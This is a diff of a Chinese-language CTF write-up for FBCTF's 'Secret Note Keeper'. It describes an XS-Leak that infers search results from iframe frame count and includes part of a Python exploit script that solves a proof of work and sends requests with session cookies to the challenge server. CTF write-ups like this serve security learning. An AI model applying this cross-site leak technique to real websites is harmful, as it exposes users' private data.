@@ -1,5 +1,9 @@
 # Secret Note Keeper
 
+Solved: 61
+
+<br>
+
 ## 題目分析
 
 - 這題乍看之下功能跟 35C3 filemanager 沒啥兩樣
@@ -18,7 +22,7 @@
 ## Exploit
 
 - 這題很明顯想考 XS-Leak
-- 到這邊大概就能想到可以利用 frame count 去判斷是否有找到 Note
+- 到這邊大概就能想到可以利用 frame count (`contentWindow.length`) 去判斷是否有找到 Note
     - 有找到 => frame count >= 1
     - 沒找到 => frame count = 0
 
@@ -29,26 +33,24 @@ import requests
 import hashlib
 import re
 
-
 def POW(target):
-    mx = 10 ** 9
+    mx = 10 ** 8
     nonce = 0
     while nonce < mx:
-        string = str(nonce)
-        hash_result = hashlib.md5(string).hexdigest()
-        if hash_result.startswith(target):
-            print(hash_result)
-            return string
+        s = str(nonce)
+        res = hashlib.md5(s).hexdigest()
+        if res.startswith(target):
+            print(res)
+            return s
         nonce += 1
 
-alphabet = "@#$%^&*()-=+~:?0123456789|abcdefghijklmnopqrstuvwxyz<>ABCDEFGHIJKLMNOPQRSTUVWXYZ_"
+alphabet = "!-=+~:?0123456789|abcdefghijklmnopqrstuvwxyz<>ABCDEFGHIJKLMNOPQRSTUVWXYZ_"
 
 for i in alphabet:
 
-    cookie = {"session":"286b4d92-cf9d-4d8e-9da2-0d0ce6317ac2", "session":".eJwljjkOwzAMBP_C2oUOkiL9mUA8hKS14yrI32Mg2HJmgP3AYx15PmF_H1du8HgF7CAqXNVwJmG0qj0saBWt6qUPjegmprfC5u6JVKVRXblWcZ73PI14Yl9cR5_CLDciTjJyq3fVE4uMKbpKM13JEpjC3tpAD9jgOvP4n8HW4PsDAtIvzQ.XPJRVA.1J6roM-pNGSVmS9OS0rJr_BICpI;"}
+    cookie = {"session":"286b4d92-cf9d-5d8e-9da2-0d2ce4617ac3", "session":".eJwljgkOwzAMBP_C5oUOkiL2mUA8hKS14ySI32Mg2HJmgPBAYx15PmF_H5du8HgF7CdqXaVwJOG4qj0saBWt6qUPGegmprfD5u6JVKVRXblWbZ74PI16Yl9cR5_CLDciTxJyq3fVE9uMKbpKM13JEpjC3tpAD0jgOvP4n8HW4PsDAIIvzQ.XPJRVA.xJ6roM-pNGsVmS9dS0rJr_BoCpI;"}
 
     r = requests.get("http://challenges.fbctf.com:8082/report_bugs", cookies=cookie)
-    #print(r.cookies)
 
     x = re.findall("proof of work for (.*) \(", r.text)
     print(x[0])
